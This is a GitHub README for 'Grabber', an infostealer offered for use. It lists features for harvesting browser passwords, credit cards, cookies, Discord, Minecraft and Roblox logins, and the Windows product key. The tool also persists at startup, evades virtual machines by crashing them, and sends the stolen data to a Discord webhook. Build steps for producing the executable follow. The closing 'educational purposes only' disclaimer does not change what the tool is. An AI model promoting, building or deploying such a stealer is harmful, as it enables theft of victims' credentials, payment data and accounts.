<div align="center">
    <h1>Grabber</h1>
    <a href="https://github.com/JustYuuto/Grabber/issues">
        <img alt="GitHub issues" src="https://img.shields.io/github/issues/JustYuuto/Grabber?style=for-the-badge">
    </a>
    <img alt="Lines of code" src="https://img.shields.io/tokei/lines/github/JustYuuto/Grabber?style=for-the-badge">
    <img alt="GitHub code size in bytes" src="https://img.shields.io/github/repo-size/JustYuuto/Grabber?style=for-the-badge">
    <a href="https://github.com/JustYuuto/Grabber/wiki">
        <img alt="Read Docs" src="https://img.shields.io/badge/Read-Docs-blue?style=for-the-badge">
    </a>
</div>

--------------------------

## Functionalities

Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities). Items in bold are functionalities you can get hyped with!

* Made for Windows, but can work on macOS and Linux with Wine
* Can add itself to startup programs
* Can get IP info
* Can get OS info: RAM, OS version, computer name...
* Can get Windows product key
* Can kill Discord processes
* **Can take a screenshot of all monitors**
* **Can get Chrome-based browsers logins and passwords, credit cards, cookies, history** 
* Can get Minecraft and Roblox logins
* Can trigger a BSOD if the grabber is run from a virtual machine
* **Can get Discord token** (killing the Discord client is not needed)

Everything is sent through a Discord Webhook.

## Using it

First, you need to clone the repo and enter the repo directory:

```bash
git clone https://github.com/JustYuuto/Grabber.git
cd Grabber
```

Then you need to configure the [``config.js``](config.js) file, like setting a webhook URL, changing the app name...

When you're done with the configuration, you can build the exe file! Use this command to build it:

```bash
yarn build
```

This will build the Chrome-based browsers encryption key decryptor, the Discord token decryptor, build the icon to a ``.ico`` file, and then build the final exe.

> The EXE build can be **very long** (about 20 minutes), so be very patient ^^

## Todo

* [ ] Replace Python files by JS code to make the executable lighter
* [ ] Nuke Discord account functionality

## Responsibility

I, Yuuto, and other contributors, will not accept any responsibility case for damage done using this tool. This was made for educational and demonstration purposes only.
